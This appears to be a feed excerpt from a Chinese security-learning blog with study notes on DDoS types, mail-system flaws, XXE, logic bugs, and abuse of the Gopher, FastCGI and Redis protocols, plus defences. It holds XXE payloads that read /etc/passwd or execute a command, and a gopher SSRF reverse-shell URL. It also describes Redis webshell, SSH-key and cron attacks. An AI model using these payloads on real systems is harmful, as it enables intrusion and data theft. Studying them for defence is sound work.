r</td><td>直接使用rlogin</td></tr><tr><td>67/68</td><td>dhcp</td><td>劫持欺骗</td></tr></tbody></table><p><strong>注意：端口可能会被更改或隐藏以达到防御目的</strong><br><strong>这个时候就需要进行端口爆破</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;web类&quot;&gt;&lt;a href=&quot;#web类&quot; class=&quot;headerlink&quot; title=&quot;web类&quot;&gt;&lt;/a&gt;web类&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;struts2：&lt;/strong&gt;&lt;br&gt;太多，略……&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;thinkphp：&lt;/</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>DDOS攻击</title>
    <link href="https://liu1272.github.io/2023/07/11/DDOS%E6%94%BB%E5%87%BB/"/>
    <id>https://liu1272.github.io/2023/07/11/DDOS%E6%94%BB%E5%87%BB/</id>
    <published>2023-07-10T17:47:00.000Z</published>
    <updated>2023-07-17T18:36:58.448Z</updated>
    
    <content type="html"><![CDATA[<h3 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h3><p>Dos是拒绝服务式攻击。<br>一切能引起DOS行为的攻击都被称为Dos攻击。<br>该攻击的效果是使得计算机或网络无法提供正常的服务。</p><h4 id="SYN洪水攻击（SYN-flood）"><a href="#SYN洪水攻击（SYN-flood）" class="headerlink" title="SYN洪水攻击（SYN flood）"></a>SYN洪水攻击（SYN flood）</h4><p>SYN洪水攻击属于DoS攻击的一种<br>它利用TCP协议缺陷，通过发送大量的半连接请求，耗费目标服务的CPU和内存资源。<br>对于TCP连接而言，当服务器接收到连接请求(SYN=i )时，则将此信息加入未连接队列，并发送请求包给客户端( SYN=j,ACK=i+1 )，此时进入SYN RECV状态。当服务器未收到客户端的确认包时，重发请求包，一直到超时才将此条目从未连接队列删除。<br><strong>攻击的方式:</strong></p><ol><li>利用特殊的程序，设置TCP的Header，向服务器源源不断的发送只有SYN标志的TCP连接请求</li><li>服务器接收并为这些请求建立会话，并把它们全部加入未连接队列中并等待客户的确认</li><li>由于源地址是不存在的，服务器需要不断的重发直至超时<br>这些伪造的SYN包将长时间占用未连接队列，而正常的SYN 请求被丢弃，那么服务器就不能接收其他正常用户的请求了。<br>而且SYN攻击除了能影响主机外，还可以危害路由器、防火墙等网络系统，事实上SYN攻击并不管目标是什么系统，<strong>只要这些系统打开TCP服务就可以实施。</strong></li></ol><h4 id="DNS欺骗式攻击"><a href="#DNS欺骗式攻击" class="headerlink" title="DNS欺骗式攻击"></a>DNS欺骗式攻击</h4><p>攻击者先执行利用型攻击（如缓冲区溢出、特洛伊木马等）侵入DNS服务器的高速缓存并将不同的域名映射到被攻击目标的IP。<br>若此时用户发出一个域名解析请求，那么得到的就是被攻击者的IP，被攻击目标会收到大量的网页连接报文，造成DDOS攻击。</p><h4 id="DNS反弹式攻击（放大攻击）"><a href="#DNS反弹式攻击（放大攻击）" class="headerlink" title="DNS反弹式攻击（放大攻击）"></a>DNS反弹式攻击（放大攻击）</h4><p>攻击者发送源IP为被攻击目标IP的查询报文到大量开放的DNS服务器，DNS服务器把相应的应答报文发送到被攻击目标形成DDOS攻击。<br><strong>原理：</strong><br>域名服务器对特定的查询报文返回应答报文可超过512字节，所以一个64字节的DNS查询报文就可产生一个大于4000字节的响应报文<br>由于以太网MTU限制，被分为3个IP包在网络中传输，流量的放大比率近1:73。</p><h4 id="ICMP-Flood（死亡Ping）"><a href="#ICMP-Flood（死亡Ping）" class="headerlink" title="ICMP Flood（死亡Ping）"></a>ICMP Flood（死亡Ping）</h4><p>在短时间内向目的主机发送大量的ping的echo报文，主机不断响应，造成网络堵塞，主机资源耗尽。<br>尽管某些 ping 数据包非常小，但 IPv4 ping 数据包要大得多，并且可以达到 65,535 字节的最大允许数据包大小。<br>某些 TCP/IP 系统从未设计用于处理大于最大值的数据包，从而使其容易受到大于该大小的数据包的攻击。<br>当恶意大数据包从攻击者传输到该目标时，该数据包将分成多个分段，每个分段均低于最大大小限制。<br>当目标计算机尝试将这些部分一起放回时，总数超出大小限制，并且可能发生缓冲区溢出，从而导致目标计算机冻结、崩溃或重启。</p><h4 id="UDP-Flood"><a href="#UDP-Flood" class="headerlink" title="UDP Flood"></a>UDP Flood</h4><p>UDP协议是一种无连接的服务，在UDP FLOOD攻击中，攻击者可发送大量伪造源IP地址的小UDP包冲击服务器。<br>正常应用情况下，UDP包双向流量会基本相等，而且大小和内容都是随机的，变化很大。<br>出现UDP Flood的情况下，针对同一目标IP的UDP包在一侧大量出现，并且内容和大小都比较固定。</p><h4 id="IP-Flood"><a href="#IP-Flood" class="headerlink" title="IP Flood"></a>IP Flood</h4><p>这种攻击利用TC0协议栈的RST位来实现<br>假设有有个合法的用法(1.1.1.1)已经与服务器建立了连接，攻击者构造攻击的TCP数据，伪装自己的ip为1.1.1.1，并向服务器发送有一个带有RST位的TCP数据段<br>服务器接收到这样的数据后，认为从1.1.1.1发送的连接有错误，就会清空缓冲区中已经建立好的连接<br>这时合法用户1.1.1.1再发送合法数据，服务器就已经没有这样的连接了，该用户就被拒绝服务而只能重新开始建立新的连接。</p><h4 id="Teardrop泪滴攻击"><a href="#Teardrop泪滴攻击" class="headerlink" title="Teardrop泪滴攻击"></a>Teardrop泪滴攻击</h4><p>Teardrop攻击是一种拒绝服务攻击，是一种针对IP协议的攻击方法<br>当“13位分片偏移”字段设置成错误的值(既可与上一分片数据重叠，也可错开)<br>服务端在组合这种含有重叠偏移的伪造分片报文时，end-offset会溢出，产生一个非常大的数<br>这部分溢出数据可能会覆盖系统内存的重要内存，甚至导致系统的崩溃等。</p><h4 id="反射攻击"><a href="#反射攻击" class="headerlink" title="反射攻击"></a>反射攻击</h4><p>将源ip设置为目标ip并向大量服务器发送可返回数据请求</p><h4 id="FIN-RST-Flood攻击"><a href="#FIN-RST-Flood攻击" class="headerlink" title="FIN/RST Flood攻击"></a>FIN/RST Flood攻击</h4><p>TCP交互过程中FIN报文用来正常关闭TCP连接，RST报文用来异常断开TCP连接。<br>当使用伪造ip向服务器发送RST数据包而且ip正好是用户ip时，用户的链接被中断。</p><h4 id="HTTP攻击（CC攻击）"><a href="#HTTP攻击（CC攻击）" class="headerlink" title="HTTP攻击（CC攻击）"></a>HTTP攻击（CC攻击）</h4><p><code>Challenge Collapsar</code>攻击是针对Web服务在第七层协议（应用层）发起的攻击<br>一般的攻击者会选择搜索之类需要做大量数据查询的页面作为攻击目标，可以消耗服务器尽可能多的资源。<br>攻击时尽量选择正常用户也通过APP访问的页面，一般来说就是各种Web API。<br>正常用户和恶意流量都是来源于APP，人机差别很小，基本融为一体难以区分。<br>但是由于HTTP协议实际上是基于tcp协议的，需要三次握手，所以不能伪造ip</p><h4 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h4><ol><li>使用工具根据IP地址的路径逻辑检测出矛盾，从而判断是否是正常流量</li><li>CDN、高防、负载均衡、分布式集群防御</li><li>限制特定流量：检查访问来源做适当限制</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;DOS攻击&quot;&gt;&lt;a href=&quot;#DOS攻击&quot; class=&quot;headerlink&quot; title=&quot;DOS攻击&quot;&gt;&lt;/a&gt;DOS攻击&lt;/h3&gt;&lt;p&gt;Dos是拒绝服务式攻击。&lt;br&gt;一切能引起DOS行为的攻击都被称为Dos攻击。&lt;br&gt;该攻击的效果是使得计算机或网络</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>邮件系统漏洞攻击</title>
    <link href="https://liu1272.github.io/2023/07/10/%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/"/>
    <id>https://liu1272.github.io/2023/07/10/%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</id>
    <published>2023-07-09T17:30:00.000Z</published>
    <updated>2023-07-17T17:47:08.670Z</updated>
    
    <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>漏洞攻击是危害网络安全中较为常见的一种。<br>不同应用程序彼此之间的相互作用，如大多数程序必须与其它API相交互，保存并检索文件，同时运行在多种不同类型的设备上，都会可能产生漏洞；<br>又如互联网通信协议—TCP和UDP，其开放性常常引来黑客的攻击；而IP地址的脆弱性，也给黑客的伪造提供了可能，从而泄露远程服务器的资源信息。</p><h4 id="危害-漏洞利用"><a href="#危害-漏洞利用" class="headerlink" title="危害/漏洞利用"></a>危害/漏洞利用</h4><p><strong>一、IMAP 和 POP 漏洞：</strong><br>这些协议常见弱点是密码脆弱，同时，各种IMAP和POP服务还容易受到如缓冲区溢出等类型的攻击。</p><p><strong>二、拒绝服务（DoS）攻击：</strong><br>1.死亡Ping——发送一个无效数据片段，该片段始于包结尾之前，但止于包结尾之后；<br>2.同步攻击——极快地发送TCP SYN包（它会启动连接），使受攻击的机器耗尽系统资源，进而中断合法连接；<br>3.循环——发送一个带有完全相同的源／目的地址／端口的伪造SYN包，使系统陷入一个试图完成TCP连接的无限循环中。<br><strong>DDOS攻击的相关内容后面再写</strong></p><p><strong>三、系统配置漏洞：</strong><br>1.默认配置——大多数系统在交付给客户时都设置了易于使用的默认配置，被黑客盗用变得轻松；2.空的／默认根密码——许多机器都配置了空的或默认的根／管理员密码，并且其数量多得惊人；<br>3.漏洞创建——几乎所有程序都可以配置为在不安全模式下运行，这会在系统上留下不必要的漏洞。</p><p><strong>四、利用软件问题：</strong><br>在服务器守护程序、客户端应用程序、操作系统和网络堆栈中，存在很多的软件错误，分为以下几类：<br>1.缓冲区溢出——程序员会留出一定数目的字符空间来容纳登录用户名，黑客则会通过发送比指定字符串长的字符串，其中包括服务器要执行的代码，使之发生数据溢出，造成系统入侵。<br>2.意外组合——程序通常是用很多层代码构造而成的，入侵者可能会经常发送一些对于某一层毫无意义，但经过适当构造后对其他层有意义的输入。<br>3.未处理的输入——大多数程序员都不考虑输入不符合规范的信息时会发生什么。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;p&gt;漏洞攻击是危害网络安全中较为常见的一种。&lt;br&gt;不同应用程序彼此之间的相互作用，如大多数程序必须与其它API相交互，保存并检索文件，同时运行</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>XXE（XML外部实体注入）</title>
    <link href="https://liu1272.github.io/2023/07/09/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/"/>
    <id>https://liu1272.github.io/2023/07/09/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/</id>
    <published>2023-07-09T08:17:00.000Z</published>
    <updated>2023-07-19T07:21:30.841Z</updated>
    
    <content type="html"><![CDATA[<h4 id="了解XML"><a href="#了解XML" class="headerlink" title="了解XML"></a>了解XML</h4><p>XML 是一种标记语言，很类似于 HTML<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息<br>因此我们需要编写软件或者程序，才能传送、接收和显示出这个文档。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>XXE是针对解析XML输入的应用程序的一种攻击。<br>当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。</p><h4 id="常见漏洞存在点"><a href="#常见漏洞存在点" class="headerlink" title="常见漏洞存在点"></a>常见漏洞存在点</h4><p>可解析xml的api接口</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>内网端口扫描</li><li>利用file协议等读取文件</li><li>攻击内网web应用使用</li><li>get(struts2等)</li></ol><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol><li>导致可以加载恶意外部文件</li><li>造成文件读取（信息泄露、SSRF）<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre></li><li>内网端口扫描<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;http://192.168.31.124:4444/test&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;&lt;/r&gt;</code></pre></li><li>攻击内网网站（命令执行）<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;except://id&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre></li><li>发起dos攻击等危害（拒绝服务）</li></ol><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ol><li>过滤用户提交的XML数据</li><li>将PHP程序的libxml_disable_entity_loader设置为TRUE来禁用外部实体</li><li>java如下更改配置<pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre></li><li>python如下配置<pre><code>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre></li></ol><h4 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h4><p><a href="https://smms.app/image/mKHhc1M6lY5OjnD" target="_blank"><img src="https://s2.loli.net/2023/07/19/mKHhc1M6lY5OjnD.png" ></a></p><p><code>XSS</code> 是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。<br>修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p><p><code>CSRF</code> 是跨站请求伪造攻击，没有在关键操作执行时进行是否由用户自愿发起的确认。<br>修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.</p><p><code>XXE</code> 是XML中可以通过调用实体来请求本地或者远程内容<br>修复方式：XML解析库在调用时严格禁止对外部实体的解析</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;了解XML&quot;&gt;&lt;a href=&quot;#了解XML&quot; class=&quot;headerlink&quot; title=&quot;了解XML&quot;&gt;&lt;/a&gt;了解XML&lt;/h4&gt;&lt;p&gt;XML 是一种标记语言，很类似于 HTML&lt;br&gt;XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息</summary>
      
    
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="https://liu1272.github.io/2023/07/09/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>https://liu1272.github.io/2023/07/09/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-07-09T07:53:00.000Z</published>
    <updated>2023-07-09T08:11:02.285Z</updated>
    
    <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p><a href="https://smms.app/image/XQtTYJOM86jfR1K" target="_blank"><img src="https://s2.loli.net/2023/07/09/XQtTYJOM86jfR1K.png" ></a></p><h4 id="常见的逻辑漏洞"><a href="#常见的逻辑漏洞" class="headerlink" title="常见的逻辑漏洞"></a>常见的逻辑漏洞</h4><h5 id="订单任意金额修改"><a href="#订单任意金额修改" class="headerlink" title="订单任意金额修改"></a>订单任意金额修改</h5><p>相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数。<br><strong>预防思路：</strong></p><ul><li>订单需要多重效验</li><li>订单数值较大的时候需要人工审核<h5 id="验证码回传"><a href="#验证码回传" class="headerlink" title="验证码回传"></a>验证码回传</h5>该类型漏洞一般发生在账号密码找回、账号注册、支付订单等。验证码发送途径一般为手机短信、邮箱邮件</li></ul><p><strong>预防思路：</strong></p><ul><li>验证码不要放在数据包内，而是在后端验证，缺点是服务器的运算压力也会随之增加</li><li>如果要进行前端验证的话也可以，但是需要进行加密<h5 id="未进行登陆凭证验证"><a href="#未进行登陆凭证验证" class="headerlink" title="未进行登陆凭证验证"></a>未进行登陆凭证验证</h5>有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未<br>经授权访问这些敏感信息甚至是越权操作。比如后台页面、订单ID枚举、敏感信息可下载、没<br>验证ID或cookie验证导致越权。</li></ul><p><strong>预防思路：</strong></p><ul><li>对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证<h5 id="接口无限制枚举"><a href="#接口无限制枚举" class="headerlink" title="接口无限制枚举"></a>接口无限制枚举</h5></li></ul><p><strong>漏洞点：</strong></p><ul><li>某电商登陆接口无验证导致撞库</li><li>某招聘网验证码无限制枚举</li><li>某快递公司优惠券枚举</li><li>某电商会员卡卡号枚举</li></ul><p><strong>预防思路：</strong></p><ul><li>在输入接口设置验证，如token，验证码，并使用后端验证。</li><li>注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。</li><li>验证码尽量使用6位以上字母加数字进行组合，并且设定较短时间期限。</li><li>号码尽量不要存在规律性和简短性<h5 id="cookie设置存在缺陷"><a href="#cookie设置存在缺陷" class="headerlink" title="cookie设置存在缺陷"></a>cookie设置存在缺陷</h5></li></ul><p><strong>漏洞点：</strong></p><ul><li>Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单</li><li>cookie存在被盗风险，即用户重置密码后使用老cookie依然可以通过验证</li><li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。不能采取简单的base64等算法</li><li>越权：平行越权：权限类型不变，权限ID改变；垂直越权：权限ID不变，权限类型改变；交叉越权：即改变ID，也改变权限</li></ul><p><strong>预防思路：</strong></p><ul><li>cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才<br>能返回数据。</li><li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。</li><li>用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。</li><li>cookie中设定session参数，以防cookie可以长时间生效。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://smms.app/image/XQtTYJOM86jfR1K&quot; target=&quot;_blank&quot;&gt;&lt;img </summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>协议拓展</title>
    <link href="https://liu1272.github.io/2023/07/08/%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95/"/>
    <id>https://liu1272.github.io/2023/07/08/%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95/</id>
    <published>2023-07-07T19:03:00.000Z</published>
    <updated>2023-07-07T20:05:59.821Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>在WWW出现之前，Gopher是Internet上最主要的信息检索工具<br>GOPHER协议是一种比HTTP协议还要古老的协议，默认工作端口70<br>GOPHER协议可以以单个URL的形式传递POST请求，同时支持换行（能换行就有很大操作空间）</p><h4 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h4><pre><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流注意要有一个_，这个符号可以换成任意一个字符</code></pre><h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><p>准备好请求数据</p><pre><code>GET /testg.php?name=xxx HTTP/1.1Host: 10.211.55.2</code></pre><p>用BP全编码</p><pre><code>%47%45%54%20%2f%74%......</code></pre><p>加上格式</p><pre><code>gopher://10.211.55.2:80/_%47%45%54%20%2f%74%......</code></pre><p><em><strong>编码的时候在最后一定要补%0d%0a代表结束<br>问号需要转码为URL编码，也就是%3f</strong></em></p><h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><p>准备好请求数据</p><pre><code>POST /testg.php HTTP/1.1Host: 10.211.55.2Content-Type: application/x-www-form-urlencodedContent-Length: 8 name=xxx</code></pre><p>用BP全编码</p><pre><code>%50%4f%53%54%20%2f%74%65%73%7......</code></pre><p>加上格式</p><pre><code>gopher://10.211.55.2:80/_%50%4f%53%54%20%2f%74%65%73%7......</code></pre><p><em><strong>编码的时候在最后一定要补%0d%0a代表结束<br>问号需要转码为URL编码，也就是%3f</strong></em></p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>协议可以几乎无限制地传输各种数据</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>反弹shell</p><pre><code>http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc</code></pre><p><a href="https://gitcode.net/mirrors/tarunkant/Gopherus?utm_source=csdn_github_accelerator">监测及RCE工具</a></p><h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>FastCGI协议和HTTP协议一样是通信协议<br>http是浏览器（也就是客户端）和服务器中间件之间通信的协议，而FastCGI协议是服务器中间件和某种语言编写的正在运行的后端程序间的通信协议。<br>它支持分布式的运算，所以 FastCGI 程序可以在网站服务器以外的主机上执行，并且可以接受来自其它网站服务器的请求<br>FastCGI将CGI解释器进程保持在内存中，以此获得较高的性能</p><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><p><a href="https://smms.app/image/oWEr76O4A5hLaJj" target="_blank"><img src="https://s2.loli.net/2023/07/08/oWEr76O4A5hLaJj.png" ></a></p><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>PHP-FPM（fastcgi进程管理器）默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>需要一个php文件，首选/var/www/html/index.php</li><li>然后要在PHP.INI中打开配置项auto_prepend_file和auto_append_file</li><li>接着使用上面说的那个Gopherus工具生成payload</li><li>根据配置文件Web Server辨别不是静态文件，此时就需要去找 PHP解析器来处理</li><li>Web Server收到 index.php 这个请求后，会启动对应的CGI 程序，也就是PHP解析器</li><li>PHP解析器会解析php.ini文件，然后就执行完一整个工作流程返回数据</li></ol><h3 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h3><h4 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h4><p>redis是一个key-value存储系统<br>它对数据支持复杂的操作、支持各种不同方式的排序、为了保证效率数据缓存在内存中<br>redis数据库一种，默认绑定在0.0.0.0:6379，攻击者直接可以访问到<br>默认无密码，登录账户为root</p><h4 id="存在漏洞"><a href="#存在漏洞" class="headerlink" title="存在漏洞"></a>存在漏洞</h4><ol><li>未授权访问</li><li>访问敏感文件</li><li>root权限写入webshell</li><li>root权限写入公私钥</li></ol><h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>能访问到、能登录、能写入（有root）</p><ol><li>开放在公网，没有和ip绑定，默认无密码</li><li>root权限</li><li>webshell和公私钥匙通信原理</li><li>有可能把redis的默认端口6379修改</li></ol><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h5><p>Redis默认情况下，会绑定在0.0.0.0:6379<br>如果没有配置非信任来源的IP访问限制，就会将Redis服务暴露在公网上<br>如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据</p><h5 id="Redis写入Webshell"><a href="#Redis写入Webshell" class="headerlink" title="Redis写入Webshell"></a>Redis写入Webshell</h5><p>如果存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限<br>即可通过redis在指定的web目录下写入一句话木马，用菜刀连接可达到控制服务器的目的</p><h5 id="Redis密钥登录SSH"><a href="#Redis密钥登录SSH" class="headerlink" title="Redis密钥登录SSH"></a>Redis密钥登录SSH</h5><p>redis对外开放，且是未授权访问状态，并且redis服务ssh对外开放，可以通过key登入时<br>在数据库中插入一条数据，将本机的公钥作为value，key值随意<br>然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys<br>把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key</p><h5 id="利用计划任务反弹shell"><a href="#利用计划任务反弹shell" class="headerlink" title="利用计划任务反弹shell"></a>利用计划任务反弹shell</h5><p>利用Redis未授权漏洞，可以通过写入文件到系统计划任务目录 /var/spool/cron下来执行</p><h5 id="远程主从复制RCE"><a href="#远程主从复制RCE" class="headerlink" title="远程主从复制RCE"></a>远程主从复制RCE</h5><p>4.x、5.x版本中，Redis提供了主从模式<br>主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写<br>通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式<br>在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件<br>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令<br>缺点是如果目标机子只允许本地登录，则这种利用方法就不行了</p><h5 id="本地Redis主从复制RCE反弹shell"><a href="#本地Redis主从复制RCE反弹shell" class="headerlink" title="本地Redis主从复制RCE反弹shell"></a>本地Redis主从复制RCE反弹shell</h5><p>对于只允许本地连接的Redis服务器，可以通过开启主从模式从远程主机上同步恶意.so文件至本地，接着载入恶意.so文件模块，反弹shell至远程主机。</p><h4 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h4><p>redis的安全设置：设置完毕，需要重加载配置文件启动redis</p><ol><li>绑定内网ip地址进行访问</li><li>requirepass设置redis密码</li><li>保护模式开启protected-mode开启（默认开启）</li><li>最好把端口更改</li><li>单独为redis设置一个普通账号，启动redis</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Gopher协议&quot;&gt;&lt;a href=&quot;#Gopher协议&quot; class=&quot;headerlink&quot; title=&quot;Gopher协议&quot;&gt;&lt;/a&gt;Gopher协议&lt;/h3&gt;&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SSRF服务器端请求伪造</title>
    <link href="https://liu1272.github.io/2023/07/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <id>https://liu1272.github.io/2023/07/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</id>
    <published>2023-07-07T07:50:00.000Z</published>
    <updated>2023-07-19T07:17:42.230Z</updated>
    
